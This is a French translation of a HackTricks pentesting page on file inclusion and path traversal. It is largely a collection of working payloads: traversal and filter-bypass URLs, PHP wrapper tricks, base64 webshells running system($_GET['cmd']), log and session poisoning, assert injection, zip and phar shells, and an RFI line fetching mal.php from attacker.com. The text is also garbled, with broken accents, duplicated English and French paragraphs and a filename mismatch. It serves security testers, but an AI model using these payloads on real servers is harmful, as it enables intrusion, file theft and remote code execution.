# Inclusion de fichiers/Travers√©e de chemin

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof sont lanc√©es uniquement lorsque les clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez une l√©gende du piratage web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos piratages !

{% embed url="https://hackenproof.com/register" %}

## Inclusion de fichiers

**Inclusion de fichiers distants (RFI) :** Le fichier est charg√© √† partir d'un serveur distant (id√©al : vous pouvez √©crire le code et le serveur l'ex√©cutera). En PHP, cela est **d√©sactiv√©** par d√©faut (**allow\_url\_include**).\
**Inclusion de fichiers locaux (LFI) :** Le serveur charge un fichier local.

La vuln√©rabilit√© se produit lorsque l'utilisateur peut contr√¥ler de quelque mani√®re que ce soit le fichier qui va √™tre charg√© par le serveur.

Fonctions PHP vuln√©rables : require, require\_once, include, include\_once

Un outil int√©ressant pour exploiter cette vuln√©rabilit√© : [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Aveugle - Int√©ressant - Fichiers LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**En m√©langeant plusieurs listes LFI \*nix et en ajoutant plus de chemins, j'ai cr√©√© celle-ci :**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Essayez √©galement de changer `/` pour `\`\
Essayez √©galement d'ajouter `../../../../../`

Une liste qui utilise plusieurs techniques pour trouver le fichier /etc/password (afin de v√©rifier si la vuln√©rabilit√© existe) peut √™tre trouv√©e [ici](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

En fusionnant plusieurs listes, j'ai cr√©√© celle-ci :

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Essayez √©galement de changer `/` pour `\`\
Essayez √©galement de supprimer `C:/` et d'ajouter `../../../../../`

Une liste qui utilise plusieurs techniques pour trouver le fichier /boot.ini (afin de v√©rifier si la vuln√©rabilit√© existe) peut √™tre trouv√©e [ici](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Consultez la liste LFI de Linux.

## LFI de base et contournements

Tous les exemples sont pour l'inclusion de fichiers locaux, mais peuvent √©galement √™tre appliqu√©s √† l'inclusion de fichiers distants (page=[http://monserveur.com/phpshellcode.txt\\](http://monserveur.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### s√©quences de travers√©e d√©pouill√©es de mani√®re non r√©cursive

When performing file inclusion attacks, it is common to use traversal sequences to access files outside of the intended directory. However, in some cases, the application may strip these traversal sequences in a non-recursive manner.

Lors de l'ex√©cution d'attaques d'inclusion de fichiers, il est courant d'utiliser des s√©quences de travers√©e pour acc√©der √† des fichiers en dehors du r√©pertoire pr√©vu. Cependant, dans certains cas, l'application peut supprimer ces s√©quences de travers√©e de mani√®re non r√©cursive.

For example, let's say the application replaces "../" with an empty string. If we provide the input "../../../../etc/passwd", the application will strip the "../" part, resulting in "etc/passwd". This can limit the effectiveness of traditional traversal sequences.

Par exemple, supposons que l'application remplace "../" par une cha√Æne vide. Si nous fournissons l'entr√©e "../../../../etc/passwd", l'application supprimera la partie "../", ce qui donnera "etc/passwd". Cela peut limiter l'efficacit√© des s√©quences de travers√©e traditionnelles.

To bypass this non-recursive stripping, we can use alternative traversal sequences that are not affected by the application's filtering. For instance, we can try using encoded characters or different representations of traversal sequences.

Pour contourner cette suppression non r√©cursive, nous pouvons utiliser des s√©quences de travers√©e alternatives qui ne sont pas affect√©es par le filtrage de l'application. Par exemple, nous pouvons essayer d'utiliser des caract√®res encod√©s ou des repr√©sentations diff√©rentes des s√©quences de travers√©e.

By experimenting with different traversal sequences, we can potentially find a sequence that the application does not strip, allowing us to access files outside of the intended directory.

En exp√©rimentant avec diff√©rentes s√©quences de travers√©e, nous pouvons potentiellement trouver une s√©quence que l'application ne supprime pas, ce qui nous permet d'acc√©der √† des fichiers en dehors du r√©pertoire pr√©vu.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Octet nul (%00)**

Contourner l'ajout de caract√®res suppl√©mentaires √† la fin de la cha√Æne fournie (contournement de : $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ceci est **r√©solu depuis PHP 5.4**

### **Encodage**

Vous pouvez utiliser des encodages non standard tels que l'encodage double URL (et d'autres):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### √Ä partir d'un dossier existant

Il se peut que le back-end v√©rifie le chemin du dossier :
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Identification des dossiers sur un serveur

Selon le code applicatif / les caract√®res autoris√©s, il est possible d'explorer de mani√®re r√©cursive le syst√®me de fichiers en d√©couvrant les dossiers et pas seulement les fichiers. Pour ce faire :

* identifiez la "profondeur" de votre r√©pertoire actuel en r√©cup√©rant avec succ√®s `/etc/passwd` (si vous √™tes sur Linux) :
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* Essayez de deviner le nom d'un dossier dans le r√©pertoire actuel en ajoutant le nom du dossier (ici, `private`), puis en revenant √† `/etc/passwd`:
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* si l'application est vuln√©rable, il peut y avoir deux r√©sultats diff√©rents pour la requ√™te :
* si vous obtenez une erreur / aucune sortie, le dossier `private` n'existe pas √† cet emplacement
* si vous obtenez le contenu de `/etc/passwd`, vous avez confirm√© qu'il y a effectivement un dossier `private` dans votre r√©pertoire actuel
* les dossiers que vous avez d√©couverts en utilisant cette technique peuvent ensuite √™tre fuzz√©s pour les fichiers (en utilisant une m√©thode LFI classique) ou pour les sous-r√©pertoires en utilisant la m√™me technique de mani√®re r√©cursive.

Il est possible d'adapter cette technique pour trouver des r√©pertoires √† n'importe quel emplacement dans le syst√®me de fichiers. Par exemple, si, dans la m√™me hypoth√®se (r√©pertoire actuel √† une profondeur de 3 dans le syst√®me de fichiers), vous souhaitez v√©rifier si `/var/www/` contient un r√©pertoire `private`, utilisez la charge utile suivante :
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
La s√©quence de commandes suivante permet de g√©n√©rer des charges utiles en utilisant `sed` (1) comme entr√©e pour les outils de fuzzing d'URL tels que `ffuf` (2) :
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
```
Bien s√ªr, adaptez ces charges utiles √† vos besoins en termes de profondeur / emplacement / liste de r√©pertoires d'entr√©e.

### **Troncature de chemin**

Contournez l'ajout de plus de caract√®res √† la fin de la cha√Æne fournie (contournement de: $\_GET\['param']."php")
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Toujours essayer de **commencer** le chemin avec un **faux r√©pertoire** (a/).

**Cette vuln√©rabilit√© a √©t√© corrig√©e dans PHP 5.3.**

### **Astuces de contournement du filtre**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Inclusion de fichier √† distance

En PHP, cela est d√©sactiv√© par d√©faut car **`allow_url_include`** est **Off**. Il doit √™tre **On** pour que cela fonctionne, et dans ce cas, vous pouvez inclure un fichier PHP depuis votre serveur et obtenir une RCE (ex√©cution de code √† distance) :
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Si, pour une raison quelconque, **`allow_url_include`** est **activ√©**, mais que PHP **filtre** l'acc√®s aux pages web externes, [selon cet article](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), vous pouvez utiliser par exemple le protocole de donn√©es avec base64 pour d√©coder un code PHP en base64 et obtenir une RCE :

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Dans le code pr√©c√©dent, le `+.txt` final a √©t√© ajout√© car l'attaquant avait besoin d'une cha√Æne se terminant par `.txt`, de sorte que la cha√Æne se termine avec cela et apr√®s le d√©codage b64, cette partie ne renverra que des donn√©es ind√©sirables et le vrai code PHP sera inclus (et donc, ex√©cut√©).
{% endhint %}

Un autre exemple **sans utiliser le protocole `php://`** serait:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## √âl√©ment racine Python

En Python, dans un code comme celui-ci :
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Si l'utilisateur passe un **chemin absolu** √† **`file_name`**, le **chemin pr√©c√©dent est simplement supprim√©** :
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
C'est le comportement pr√©vu selon [la documentation](https://docs.python.org/3.10/library/os.path.html#os.path.join) :

> Si un composant est un chemin absolu, tous les composants pr√©c√©dents sont ignor√©s et la jointure continue √† partir du composant de chemin absolu.

## Java List Directories

Il semble que si vous avez une travers√©e de chemin dans Java et que vous **demandez un r√©pertoire** au lieu d'un fichier, une **liste du r√©pertoire est renvoy√©e**. Cela ne se produira pas dans d'autres langages (√† ma connaissance).

## Top 25 param√®tres

Voici une liste des 25 principaux param√®tres qui pourraient √™tre vuln√©rables aux vuln√©rabilit√©s d'inclusion de fichiers locaux (LFI) (√† partir de [ce lien](https://twitter.com/trbughunters/status/1279768631845494787)) :
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI en utilisant des wrappers et des protocoles PHP

### php://filter

Les filtres PHP permettent d'effectuer des op√©rations de **modification de base sur les donn√©es** avant leur lecture ou leur √©criture. Il existe 5 cat√©gories de filtres :

* [Filtres de cha√Æne](https://www.php.net/manual/en/filters.string.php) :
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags` : Supprime les balises des donn√©es (tout ce qui se trouve entre les caract√®res "<" et ">")
* Notez que ce filtre a disparu des versions modernes de PHP
* [Filtres de conversion](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Transforme en une autre encodage (`convert.iconv.<input_enc>.<output_enc>`). Pour obtenir la **liste de tous les encodages** pris en charge, ex√©cutez la commande suivante dans la console : `iconv -l`

{% hint style="warning" %}
En abusant du filtre de conversion `convert.iconv.*`, vous pouvez **g√©n√©rer du texte arbitraire**, ce qui peut √™tre utile pour √©crire du texte arbitraire ou ex√©cuter une fonction comme include avec du texte arbitraire. Pour plus d'informations, consultez [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtres de compression](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate` : Compresse le contenu (utile si vous devez exfiltrer beaucoup d'informations)
* `zlib.inflate` : D√©compresse les donn√©es
* [Filtres de chiffrement](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Obsol√®te
* `mdecrypt.*` : Obsol√®te
* Autres filtres
* En ex√©cutant `var_dump(stream_get_filters());` en PHP, vous pouvez trouver quelques **filtres inattendus** :
* `consumed`
* `dechunk` : inverse le codage chunked HTTP
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,¬£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
La partie "php://filter" est insensible √† la casse.
{% endhint %}

### php://fd

Ce wrapper permet d'acc√©der aux descripteurs de fichiers ouverts par le processus. Potentiellement utile pour exfiltrer le contenu des fichiers ouverts :
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Vous pouvez √©galement utiliser **php://stdin, php://stdout et php://stderr** pour acc√©der respectivement aux **descripteurs de fichiers 0, 1 et 2** (je ne suis pas s√ªr de l'utilit√© de cela dans une attaque)

### zip:// et rar://

T√©l√©chargez un fichier Zip ou Rar contenant une PHPShell √† l'int√©rieur et y acc√©dez.\
Pour pouvoir exploiter le protocole rar, il **doit √™tre sp√©cifiquement activ√©**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

La technique d'inclusion de fichiers est une vuln√©rabilit√© courante dans les applications Web qui permet √† un attaquant d'inclure des fichiers distants dans le code source de l'application. Cela peut entra√Æner l'ex√©cution de code arbitraire, la divulgation d'informations sensibles ou d'autres attaques.

La vuln√©rabilit√© d'inclusion de fichiers peut √™tre exploit√©e de diff√©rentes mani√®res, notamment en utilisant des param√®tres d'URL, des cookies, des en-t√™tes HTTP ou d'autres entr√©es utilisateur. L'attaquant peut manipuler ces entr√©es pour inclure des fichiers distants, tels que des fichiers syst√®me sensibles ou des fichiers de configuration contenant des informations sensibles.

Pour exploiter cette vuln√©rabilit√©, l'attaquant doit identifier les points d'inclusion de fichiers dans l'application cible. Cela peut √™tre fait en analysant le code source de l'application ou en utilisant des outils d'analyse automatis√©s. Une fois les points d'inclusion de fichiers identifi√©s, l'attaquant peut tester diff√©rentes techniques d'inclusion de fichiers pour d√©terminer si la vuln√©rabilit√© peut √™tre exploit√©e.

Il existe plusieurs techniques courantes d'inclusion de fichiers, telles que l'inclusion de fichiers locaux, l'inclusion de fichiers distants et l'inclusion de fichiers bas√©e sur des param√®tres d'URL. Chaque technique a ses propres particularit√©s et peut n√©cessiter des approches diff√©rentes pour l'exploitation.

Pour se prot√©ger contre les attaques d'inclusion de fichiers, il est important de mettre en ≈ìuvre des mesures de s√©curit√© appropri√©es, telles que la validation et la d√©sinfection des entr√©es utilisateur, la limitation des droits d'acc√®s aux fichiers et la configuration s√©curis√©e des param√®tres du serveur. Les tests de p√©n√©tration r√©guliers peuvent √©galement aider √† identifier et √† corriger les vuln√©rabilit√©s d'inclusion de fichiers dans les applications Web.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

Note that this protocol is restricted by php configurations **`allow_url_open`** and **`allow_url_include`**

### expect://

Expect has to be activated. You can execute code using this.

---

**Traduction en fran√ßais :**

Fun fact : vous pouvez d√©clencher une XSS et contourner l'auditeur Chrome avec : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`

Notez que ce protocole est restreint par les configurations php **`allow_url_open`** et **`allow_url_include`**

### expect://

Expect doit √™tre activ√©. Vous pouvez ex√©cuter du code en utilisant cela.
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Sp√©cifiez votre charge utile dans les param√®tres POST
```
http://example.com/index.php?page=php://input
POST DATA: <?php system('id'); ?>
```
### phar://

Un fichier `.phar` peut √©galement √™tre utilis√© pour ex√©cuter du code PHP si le site web utilise une fonction comme `include` pour charger le fichier.

{% code title="create_phar.php" %}
```python
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');

$phar->stopBuffering();
```
{% endcode %}

Et vous pouvez compiler le `phar` en ex√©cutant la ligne suivante :
```bash
php --define phar.readonly=0 create_path.php
```
Un fichier appel√© `test.phar` sera g√©n√©r√© que vous pouvez utiliser pour abuser de la LFI.

Si la LFI se contente de lire le fichier et de ne pas ex√©cuter le code PHP √† l'int√©rieur, par exemple en utilisant des fonctions telles que _**file\_get\_contents(), fopen(), file() ou file\_exists(), md5\_file(), filemtime() ou filesize()**_**. Vous pouvez essayer d'exploiter une **d√©s√©rialisation** qui se produit lors de la **lecture** d'un **fichier** en utilisant le protocole **phar**.\
Pour plus d'informations, lisez l'article suivant :

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Plus de protocoles

Consultez d'autres [**protocoles √† inclure ici**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory et php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) ‚Äî √âcrire en m√©moire ou dans un fichier temporaire (je ne suis pas s√ªr de l'utilit√© de cela dans une attaque d'inclusion de fichier)
* [file://](https://www.php.net/manual/en/wrappers.file.php) ‚Äî Acc√®s au syst√®me de fichiers local
* [http://](https://www.php.net/manual/en/wrappers.http.php) ‚Äî Acc√®s aux URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) ‚Äî Acc√®s aux URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) ‚Äî Flux de compression
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) ‚Äî Recherche de noms de fichiers correspondant √† un motif (ne renvoie rien de lisible, donc pas vraiment utile ici)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) ‚Äî Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) ‚Äî Flux audio (pas utile pour lire des fichiers arbitraires)

## LFI via l'assert de PHP

Si vous rencontrez une LFI difficile qui semble filtrer les cha√Ænes de travers√©e telles que ".." et r√©pondre avec quelque chose du genre "Tentative de piratage" ou "Belle tentative !", une charge utile d'injection 'assert' peut fonctionner.

Une charge utile comme celle-ci :
```
' and die(show_source('/etc/passwd')) or '
```
Le code PHP sera exploit√© avec succ√®s pour un param√®tre "file" qui ressemble √† ceci :
```bash
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
```
Il est √©galement possible d'obtenir une ex√©cution de code √† distance (RCE) dans une d√©claration "assert" vuln√©rable en utilisant la fonction system().
```
' and die(system("whoami")) or '
```
Assurez-vous d'encoder les charges utiles avant de les envoyer.

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est le lieu de tous les programmes de primes pour les bugs cryptographiques.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof ne sont lanc√©es que lorsque leurs clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez la l√©gende des hackers web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos hacks !

{% embed url="https://hackenproof.com/register" %}

## Travers√©e de chemin PHP aveugle

{% hint style="warning" %}
Cette technique est pertinente dans les cas o√π vous **contr√¥lez** le **chemin du fichier** d'une **fonction PHP** qui acc√©dera √† un fichier mais dont le contenu ne sera pas affich√© (comme un simple appel √† **`file()`**) mais le contenu n'est pas affich√©.
{% endhint %}

Dans [**cet incroyable article**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html), il est expliqu√© comment une travers√©e de chemin aveugle peut √™tre exploit√©e via un filtre PHP pour **exfiltrer le contenu d'un fichier via un oracle d'erreur**.

En r√©sum√©, la technique utilise le codage **"UCS-4LE"** pour rendre le contenu d'un fichier si **volumineux** que la **fonction PHP d'ouverture** du fichier d√©clenchera une **erreur**.

Ensuite, pour divulguer le premier caract√®re, le filtre **`dechunk`** est utilis√© avec d'autres filtres tels que **base64** ou **rot13**, et enfin les filtres **convert.iconv.UCS-4.UCS-4LE** et **convert.iconv.UTF16.UTF-16BE** sont utilis√©s pour **placer d'autres caract√®res au d√©but et les divulguer**.

**Fonctions pouvant √™tre vuln√©rables** : `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (seulement en lecture seule avec cela)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Pour les d√©tails techniques, consultez l'article mentionn√© !

## LFI2RCE

### Inclusion de fichier √† distance

Expliqu√© pr√©c√©demment, [**suivez ce lien**](./#remote-file-inclusion).

### Via le fichier journal Apache/Nginx

Si le serveur Apache ou Nginx est **vuln√©rable √† LFI** √† l'int√©rieur de la fonction d'inclusion, vous pouvez essayer d'acc√©der √† **`/var/log/apache2/access.log` ou `/var/log/nginx/access.log`**, en d√©finissant √† l'int√©rieur de l'**agent utilisateur** ou √† l'int√©rieur d'un **param√®tre GET** une coquille PHP comme **`<?php system($_GET['c']); ?>`** et inclure ce fichier

{% hint style="warning" %}
Notez que **si vous utilisez des guillemets doubles** pour la coquille au lieu de **guillemets simples**, les guillemets doubles seront modifi√©s pour la cha√Æne "_**quote;**_", **PHP g√©n√©rera une erreur** √† cet endroit et **rien d'autre ne sera ex√©cut√©**.

De plus, assurez-vous d'**√©crire correctement la charge utile** ou PHP g√©n√©rera une erreur √† chaque fois qu'il essaiera de charger le fichier journal et vous n'aurez pas de deuxi√®me chance.
{% endhint %}

Cela pourrait √©galement √™tre fait dans d'autres journaux, mais **soyez prudent**, le code √† l'int√©rieur des journaux pourrait √™tre encod√© en URL et cela pourrait d√©truire la coquille. L'en-t√™te **authorisation "basic"** contient "user:password" en Base64 et il est d√©cod√© √† l'int√©rieur des journaux. La coquille PHP pourrait √™tre ins√©r√©e √† l'int√©rieur de cet en-t√™te.\
Autres chemins de journal possibles :
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Liste de mots pour le fuzzing : [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Via Email

**Envoyez un courrier √©lectronique** √† un compte interne (user@localhost) contenant votre charge utile PHP comme `<?php echo system($_REQUEST["cmd"]); ?>` et essayez de l'inclure dans le courrier de l'utilisateur avec un chemin comme **`/var/mail/<NOM_UTILISATEUR>`** ou **`/var/spool/mail/<NOM_UTILISATEUR>`**

### Via /proc/\*/fd/\*

1. T√©l√©chargez de nombreux shells (par exemple : 100)
2. Incluez [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), avec $PID = PID du processus (peut √™tre obtenu par force brute) et $FD le descripteur de fichier (peut √©galement √™tre obtenu par force brute)

### Via /proc/self/environ

Comme un fichier journal, envoyez la charge utile dans l'User-Agent, elle sera refl√©t√©e dans le fichier /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via t√©l√©chargement

Si vous pouvez t√©l√©charger un fichier, injectez simplement la charge utile de l'interpr√©teur de commandes dedans (par exemple : `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Pour maintenir la lisibilit√© du fichier, il est pr√©f√©rable d'injecter dans les m√©tadonn√©es des images/doc/pdf.

### Via l'envoi de fichier ZIP

T√©l√©chargez un fichier ZIP contenant une coquille PHP compress√©e et acc√©dez-y :
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via les sessions PHP

V√©rifiez si le site web utilise les sessions PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
En PHP, ces sessions sont stock√©es dans des fichiers _/var/lib/php5/sess\\_\[PHPSESSID]\_.
```
